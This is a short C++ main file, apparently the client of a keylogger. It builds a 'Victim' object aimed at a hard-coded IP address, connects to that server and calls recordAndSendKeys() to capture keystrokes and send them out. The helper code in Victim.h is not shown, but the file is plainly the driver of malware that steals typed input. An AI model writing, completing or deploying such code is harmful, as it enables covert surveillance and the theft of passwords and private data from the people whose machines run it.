#include "Victim.h"

int main() {
	Victim* victim = new Victim("3.142.167.4");

	if (victim->connectToServer() != 0) {
		return -1;
	}
	victim->recordAndSendKeys();

	return 0;
}